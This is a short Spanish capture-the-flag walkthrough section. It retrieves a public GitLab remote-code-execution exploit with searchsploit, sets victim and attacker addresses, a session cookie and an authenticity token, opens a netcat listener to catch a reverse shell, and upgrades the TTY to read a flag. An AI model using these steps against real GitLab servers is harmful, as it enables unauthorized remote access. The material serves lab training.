## Vuln exploit & Gaining Access {-}

### Ganando accesso con Gitlab {-}

```bash
searchsploit -m 49257
mv 49257.py gitlab_rce.py
vi gitlab_rce.py
```

Mirando el codigo, vemos que este exploit nos permiteria entablar una reverse shell. Modificamos los datos

- url de la maquina victima
- url de la maquina de atacante
- puerto de escucha
- usuario gitlab
- authenticity_token
- cookie de session.

El valor del authenticity token se puede encontrar en el codigo fuente de la pagina de gitlab.
El valor del cookie de session se puede ver en la pagina de gitlab dandole a `Ctrl+Shift+c > Almacenamiento` y podemos ver el `_gitlab_session`

1. Nos ponemos en escucha por el puerto 443

    ```bash
    nc -nlvp 443
    ```

1. Lanzamos el script con el commando `python3 gitlab_rce.py`


```bash
whoami
#Output
git
```

### Tratamiento de la TTY {-}

```bash
script /dev/null -c bash
^Z
stty raw -echo; fg
-> reset
-> xterm
export TERM=xterm
export SHELL=bash

stty -a

stty rows <rownb> columns <colnb>
```

Podemos ir al directorio `/home/dude` y visualizar la flag
